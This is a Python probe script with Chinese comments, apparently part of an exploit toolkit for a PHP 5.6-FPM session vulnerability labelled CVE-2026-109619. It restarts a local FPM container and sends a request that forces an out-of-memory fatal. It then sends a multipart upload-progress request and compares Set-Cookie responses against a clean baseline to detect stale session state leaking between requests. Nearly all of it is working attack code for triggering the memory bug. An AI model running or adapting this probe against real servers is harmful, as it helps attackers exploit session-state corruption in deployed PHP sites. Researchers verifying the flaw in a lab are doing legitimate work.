#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""probe3_56.py — CVE-2026-109619 "FPM 路径" 验证探针（带基线对照）。

按 2026-10-21 PHP 安全公告（GHSA-6wmf-4rv5-p3rp）给出的已验证 FPM 场景：
  生产者（请求 A）：startup 成功后进入执行阶段，session_start() 写 $_SESSION
    （状态发布），随后执行阶段 OOM fatal 打断匹配的 reset；
    执行阶段 OOM 不杀 child（probe2_56.py + fpm_main.c 源码已实证）。
  消费者（请求 B）：multipart 带 PHP_SESSION_UPLOAD_PROGRESS，在正常 RINIT
    之前经 rfc1867 回调 php_session_initialize() 触碰残留的 session 全局态。

判定必须有基线：同样形状的消费者请求在"干净 child（无生产者）"下的
Set-Cookie 行为作为对照，与"生产者之后"的行为逐轮比较：
  NORMAL    —— 32 位 hex 新 session id（正常：early-find 未命中，发新 id）
  NO-COOKIE —— 完全没有 Set-Cookie（异常：可能 stale PS(id) 被当作有效 id，
               send_cookie=0；也可能请求形状本来就不触发，靠基线区分）
  GARBAGE   —— cookie 含二进制/超长内容（stale 指针内容被直接写进 Set-Cookie）

用法：
  python3 tools56/probe3_56.py [--rounds N]
"""

from __future__ import annotations

import argparse
import re
import subprocess
import sys
import os
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from exploit import Target, build_multipart  # noqa: E402

URL = "http://127.0.0.1:8089/index.php"


def child_pid() -> str:
    """读 fpm child 的 host PID（docker top 输出里 ppid 指向 master 的行）。"""
    out = subprocess.run(
        ["docker", "top", "php56-fpm", "-eo", "pid,ppid,comm"],
        capture_output=True, text=True,
    ).stdout.strip().splitlines()[1:]
    pids = {}
    for line in out:
        f = line.split()
        if len(f) >= 3:
            pids[f[0]] = f[1]
    for pid, ppid in pids.items():
        if ppid in pids and pid != "1":
            return pid
    return out[-1].split()[0] if out else "?"


def logs_tail(n: int = 20) -> str:
    r = subprocess.run(["docker", "logs", "--tail", str(n), "php56-fpm"],
                       capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


def run_producer(mode: int = 1) -> tuple[str, bytes]:
    """生产者：GET /gh.php?producer=N。

    mode=1 变体 A：执行阶段 session 发布 + str_repeat OOM fatal。
    mode=2 变体 B：$_SESSION 持 6MB 活串正常结束，OOM 落在 RSHUTDOWN 的
                  php_session_flush -> ps_write 序列化处（若不被 zend_try
                  捕获则跳过 php_rshutdown_session_globals -> PS(id) 残留）。
    """
    t = Target(URL, timeout=120.0, verbose=False)
    return t.get(f"/gh.php?producer={mode}", read_cap=1 << 20)


def run_consumer(sid_data: bytes = b"\x00") -> tuple[str, bytes]:
    """消费者：probe1 已验证的形状（PHPSESSID 字段 + progress 字段，无文件 part）。

    5.6 的 rfc1867 FORMDATA 钩子在解析到 PHP_SESSION_UPLOAD_PROGRESS 字段时即
    调 php_session_initialize()（早于 RINIT）；PS(id) 取自同表单的 PHPSESSID
    字段。sid_data 可控：b"\\x00" -> 空 id -> 生成新 id 并 Set-Cookie；
    合法串 -> 沿用该 id（send_cookie=0）。
    """
    parts = [
        {"name": "PHPSESSID", "data": sid_data},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    t = Target(URL, timeout=90.0, verbose=False)
    resp = t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                  read_cap=1 << 20, timeout=90.0)
    return resp.split(b"\r\n", 1)[0].decode("latin1", "replace"), resp


def cookie_of(resp: bytes) -> str:
    m = re.search(rb"Set-Cookie:\s*PHPSESSID=([^;\r\n]+)", resp, re.I)
    return m.group(1).decode("latin1", "replace") if m else ""


def classify(cookie: str) -> str:
    if not cookie:
        return "NO-COOKIE"
    if re.fullmatch(r"[0-9a-f]{26,34}", cookie):
        return "NORMAL"
    return "GARBAGE"


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--rounds", type=int, default=3, help="生产者/消费者循环次数")
    ap.add_argument("--producer", type=int, default=1, choices=[1, 2],
                    help="生产者变体：1=执行阶段 OOM fatal（A）；2=RSHUTDOWN 内 OOM（B）")
    args = ap.parse_args()

    # ---- 基线：重启 fpm 拿干净 child，无生产者直接发消费者 ----
    print("[*] restarting fpm for a clean baseline child ...")
    subprocess.run(["docker", "restart", "php56-fpm"], capture_output=True)
    time.sleep(2.0)
    base_pid = child_pid()
    print(f"[*] baseline child pid: {base_pid}")
    base_results = []
    for _ in range(2):
        st, resp = run_consumer()
        ck = cookie_of(resp)
        base_results.append(classify(ck))
        print(f"[baseline] {st} cookie={ck[:48]!r} -> {classify(ck)}")
    baseline = base_results[-1]
    print(f"[*] baseline behavior: {baseline}")

    if baseline == "NO-COOKIE":
        print("[!] 基线本身就是 NO-COOKIE：该请求形状不触发 Set-Cookie，"
              "后续 NO-COOKIE 不能作为 stale-state 证据；需要修请求形状。")

    # ---- 主循环：生产者 -> 消费者 ----
    print(f"\n[*] child pid before rounds: {child_pid()}")
    diffs = 0
    for i in range(args.rounds):
        pid0 = child_pid()
        st, body = run_producer(args.producer)
        oom = b"Allowed memory size" in body
        pid1 = child_pid()
        print(f"[round {i}] producer(v{args.producer}): {st} "
              f"OOM-fatal={'yes' if oom else 'NO'} "
              f"child {pid0}->{'survived' if pid0 == pid1 else 'DIED'}")

        cst, cresp = run_consumer()
        ck = cookie_of(cresp)
        cls = classify(ck)
        pid2 = child_pid()
        mark = ""
        if cls != baseline:
            diffs += 1
            mark = "  <== DIFFERS FROM BASELINE"
        print(f"[round {i}] consumer: {cst} cookie={ck[:48]!r} -> {cls}{mark} "
              f"child {pid1}->{'survived' if pid1 == pid2 else 'DIED'}")

    print("\n[*] fpm log tail:")
    print(logs_tail(20))
    print(f"\n[=] rounds={args.rounds} baseline={baseline} diffs={diffs}")
    if diffs:
        print("[+] consumer behavior changed after producer — stale-state "
              "consumption observable on php-5.6-fpm (CVE-2026-109619 class).")
        return 0
    print("[-] no behavioral difference vs baseline.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
